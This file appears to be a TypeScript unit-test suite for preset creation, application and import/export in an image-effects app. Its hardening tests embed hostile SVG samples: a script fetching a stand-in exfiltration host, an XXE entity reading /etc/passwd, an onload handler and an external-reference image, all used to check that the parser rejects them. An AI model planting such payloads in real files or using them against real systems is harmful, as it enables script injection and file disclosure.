import { describe, expect, it } from "vitest";
import type { LayerV1, RecipePresetV1 } from "../../src/core/types";
import {
  createLayerFromAsset,
  DEFAULT_ARTBOARD,
} from "../../src/project/factory";
import {
  applyPresetCommand,
  createPresetFromLayer,
  parsePreset,
  serializePreset,
} from "../../src/project/presets";
import { applyCommand } from "../../src/project/reducer";
import { createEmptyProjectCore } from "../../src/project/factory";

function makeLayer(): LayerV1 {
  const layer = createLayerFromAsset(
    "c".repeat(64),
    "Preset source",
    { width: 640, height: 480 },
    DEFAULT_ARTBOARD,
  );
  layer.recipe.mode = "halftone";
  layer.recipe.halftone.cellSize = 21;
  layer.recipe.halftone.dotShape = "triangle";
  layer.recipe.diffusion.algorithm = "stucki";
  layer.recipe.glitch.enabled = true;
  layer.recipe.glitch.channelDesync = 7;
  return layer;
}

describe("presets: build from layer", () => {
  it("captures mode plus all three groups and inlines the custom dot SVG", () => {
    const layer = makeLayer();
    const preset = createPresetFromLayer(layer, "Grit", "<svg/>", 12345);
    expect(preset.schema).toBe(1);
    expect(preset.name).toBe("Grit");
    expect(preset.createdAt).toBe(12345);
    expect(preset.mode).toBe("halftone");
    expect(preset.halftone).toEqual(layer.recipe.halftone);
    expect(preset.diffusion).toEqual(layer.recipe.diffusion);
    expect(preset.glitch).toEqual(layer.recipe.glitch);
    expect(preset.customDotSvg).toBe("<svg/>");
    // Deep copy: preset never aliases the live recipe.
    expect(preset.halftone).not.toBe(layer.recipe.halftone);
  });

  it("excludes transform, opacity, plates, registration, and output", () => {
    const preset = createPresetFromLayer(makeLayer(), "Lean");
    expect(Object.keys(preset).sort()).toEqual([
      "createdAt",
      "customDotSvg",
      "diffusion",
      "glitch",
      "halftone",
      "id",
      "mode",
      "name",
      "schema",
    ]);
  });
});

describe("presets: apply as a command", () => {
  it("replaces the target layer's recipe in one undoable command", () => {
    const source = makeLayer();
    const preset = createPresetFromLayer(source, "Grit");
    const target = createLayerFromAsset(
      "d".repeat(64),
      "Target",
      { width: 100, height: 100 },
      DEFAULT_ARTBOARD,
    );
    let core = createEmptyProjectCore();
    core = applyCommand(core, { type: "layer/add", layer: target });
    const next = applyCommand(core, applyPresetCommand(preset, target.id));
    expect(next.layers[0].recipe.mode).toBe("halftone");
    expect(next.layers[0].recipe.halftone.cellSize).toBe(21);
    expect(next.layers[0].recipe.glitch.channelDesync).toBe(7);
    // Transform and opacity are untouched.
    expect(next.layers[0].transform).toBe(core.layers[0].transform);
    expect(next.layers[0].opacity).toBe(1);
  });

  it("rewrites the custom shape asset id when the caller resolves one", () => {
    const preset = createPresetFromLayer(makeLayer(), "Custom dots", "<svg/>");
    const command = applyPresetCommand(preset, "layer-1", "e".repeat(64));
    expect(command.type).toBe("recipe/apply-preset");
    if (command.type === "recipe/apply-preset") {
      expect(command.halftone.customShapeAssetId).toBe("e".repeat(64));
    }
  });
});

describe("presets: serialize / parse round trip", () => {
  it("round-trips settings exactly; imported presets get a FRESH local id", () => {
    const preset = createPresetFromLayer(makeLayer(), "Round trip", null, 999);
    const result = parsePreset(serializePreset(preset));
    expect(result.ok).toBe(true);
    if (result.ok) {
      // The hardened parser never trusts the file's identity fields.
      expect(result.preset.id).not.toBe(preset.id);
      expect(result.preset.name).toBe(preset.name);
      expect(result.preset.mode).toBe(preset.mode);
      expect(result.preset.halftone).toEqual({ ...preset.halftone, customShapeAssetId: null });
      expect(result.preset.diffusion).toEqual(preset.diffusion);
      expect(result.preset.glitch).toEqual(preset.glitch);
      expect(result.preset.customDotSvg).toBe(preset.customDotSvg);
    }
  });

  it("rejects future schemas safely", () => {
    const preset = createPresetFromLayer(makeLayer(), "Future");
    const future = { ...JSON.parse(serializePreset(preset)), schema: 2 };
    const result = parsePreset(JSON.stringify(future));
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/schema 2/i);
  });

  it("rejects malformed payloads", () => {
    expect(parsePreset("not json").ok).toBe(false);
    expect(parsePreset("[1,2,3]").ok).toBe(false);
    expect(parsePreset(JSON.stringify({ schema: 1 })).ok).toBe(false);
    expect(parsePreset(JSON.stringify({ schema: 0, id: "x", name: "x" })).ok).toBe(false);
  });

  it("rejects wrong field types and unknown enum values", () => {
    const good = JSON.parse(serializePreset(createPresetFromLayer(makeLayer(), "Good")));
    const badShape = structuredClone(good);
    badShape.halftone.dotShape = "star";
    expect(parsePreset(JSON.stringify(badShape)).ok).toBe(false);

    const badMode = structuredClone(good);
    badMode.mode = "wizard";
    expect(parsePreset(JSON.stringify(badMode)).ok).toBe(false);

    const badNumber = structuredClone(good);
    badNumber.diffusion.levels = "eight";
    expect(parsePreset(JSON.stringify(badNumber)).ok).toBe(false);

    const missingBool = structuredClone(good);
    delete missingBool.glitch.enabled;
    expect(parsePreset(JSON.stringify(missingBool)).ok).toBe(false);
  });

  it("rejects a custom dot shape with no inlined SVG", () => {
    const preset = createPresetFromLayer(makeLayer(), "Custom");
    const raw: RecipePresetV1 = JSON.parse(serializePreset(preset));
    raw.halftone.dotShape = "custom";
    raw.customDotSvg = null;
    expect(parsePreset(JSON.stringify(raw)).ok).toBe(false);
  });

  it("strips unknown extra fields to the canonical shape", () => {
    const preset = createPresetFromLayer(makeLayer(), "Extra");
    const raw = JSON.parse(serializePreset(preset));
    raw.surprise = "ignored";
    raw.halftone.extra = 42;
    const result = parsePreset(JSON.stringify(raw));
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect("surprise" in result.preset).toBe(false);
      expect("extra" in result.preset.halftone).toBe(false);
    }
  });
});

/**
 * Adversarial UI-boundary payloads through the ACTUAL import parser: the
 * workspace preset import path (PresetsSection file input →
 * project.importPresetFile → THIS parsePreset) persists a preset only when
 * `ok` is true, so an `ok: false` result here proves the payload can never
 * be persisted to the repository or primed into the AssetCache.
 */
describe("presets: hardened UI import boundary", () => {
  const base = () => JSON.parse(serializePreset(createPresetFromLayer(makeLayer(), "Victim")));

  it("rejects script-bearing custom dot SVG payloads", () => {
    const raw = base();
    raw.halftone.dotShape = "custom";
    raw.customDotSvg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><script>fetch("https://exfil.example")</script><rect width="1" height="1"/></svg>';
    const result = parsePreset(JSON.stringify(raw));
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/svg/i);
  });

  it("rejects entity/DOCTYPE (XXE-style) SVG payloads", () => {
    const raw = base();
    raw.halftone.dotShape = "custom";
    raw.customDotSvg =
      '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><rect width="1" height="1"/>&xxe;</svg>';
    expect(parsePreset(JSON.stringify(raw)).ok).toBe(false);
  });

  it("rejects event-handler and external-reference SVG payloads", () => {
    for (const evil of [
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><rect width="1" height="1" onload="alert(1)"/></svg>',
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><image href="https://evil.example/x.png"/></svg>',
    ]) {
      const raw = base();
      raw.halftone.dotShape = "custom";
      raw.customDotSvg = evil;
      expect(parsePreset(JSON.stringify(raw)).ok).toBe(false);
    }
  });

  it("rejects oversized SVG payloads and oversized preset files outright", () => {
    const raw = base();
    raw.halftone.dotShape = "custom";
    raw.customDotSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><desc>${"x".repeat(
      1_100_000,
    )}</desc><rect width="1" height="1"/></svg>`;
    expect(parsePreset(JSON.stringify(raw)).ok).toBe(false);

    const padded = JSON.stringify({ ...base(), padding: "y".repeat(5 * 1024 * 1024) });
    const result = parsePreset(padded);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/exceeds/i);
  });

  it("enforces hardened numeric ranges the legacy parser accepted", () => {
    const zeroCell = base();
    zeroCell.halftone.cellSize = 0; // below the 0.5 minimum
    expect(parsePreset(JSON.stringify(zeroCell)).ok).toBe(false);

    const hugeLevels = base();
    hugeLevels.diffusion.levels = 1e9; // above the 256 cap
    expect(parsePreset(JSON.stringify(hugeLevels)).ok).toBe(false);
  });

  it("never lets a device-local asset id travel through import", () => {
    const raw = base();
    raw.halftone.customShapeAssetId = "a".repeat(64);
    const result = parsePreset(JSON.stringify(raw));
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.preset.halftone.customShapeAssetId).toBeNull();
  });
});

describe("presets: hardened UI export boundary", () => {
  it("the downloaded payload carries no device-local 64-hex asset id and reimports cleanly", () => {
    const layer = makeLayer();
    layer.recipe.halftone.dotShape = "custom";
    layer.recipe.halftone.customShapeAssetId = "ab12".repeat(16);
    const dotSvg =
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><circle cx="5" cy="5" r="4" fill="black"/></svg>';
    const preset = createPresetFromLayer(layer, "Ship It", dotSvg, 7);
    const text = serializePreset(preset);
    expect(/[0-9a-f]{64}/i.test(text)).toBe(false);
    expect(JSON.parse(text).halftone.customShapeAssetId).toBeNull();
    const reimported = parsePreset(text);
    expect(reimported.ok).toBe(true);
    if (reimported.ok) {
      expect(reimported.preset.customDotSvg).toBeTruthy();
      expect(reimported.preset.customDotSvg).not.toMatch(/script|onload/i);
    }
  });

  it("refuses to export unsafe inline SVG instead of shipping it", () => {
    const layer = makeLayer();
    const preset = createPresetFromLayer(
      layer,
      "Evil",
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><script>1</script><rect width="1" height="1"/></svg>',
    );
    expect(() => serializePreset(preset)).toThrowError();
  });
});
